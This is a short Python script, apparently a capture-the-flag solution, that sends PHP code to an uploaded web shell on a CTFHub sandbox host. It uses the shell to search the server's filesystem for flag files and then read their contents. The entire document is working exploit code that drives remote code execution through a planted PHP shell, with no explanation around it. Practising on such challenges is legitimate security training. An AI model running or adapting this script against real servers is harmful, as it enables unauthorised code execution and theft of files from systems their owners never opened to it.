import requests
import re

url = 'http://challenge-215f737f07351ff0.sandbox.ctfhub.com:10800/upload/1.php'
payload_find = "var_dump(array_merge(glob('*/flag*'), glob('/home/*/*flag*'), glob('/var/www/*/*flag*'), glob('/tmp/*flag*')));"
response1 = requests.post(url, data={"t0ur1st": payload_find})
print("=== Find flag files ===")
print(response1.text)

match = re.search(r'string\(\d+\)\s+"([^"]+)"', response1.text)
if match:
    flag_path = match.group(1)
    print("Found flag file:", flag_path)
    payload_read = f"var_dump(file_get_contents('{flag_path}'));"
    response2 = requests.post(url, data={"t0ur1st": payload_read})
    print("\n=== Read flag content ===")
    print(response2.text)
else:
    print("No flag path found.")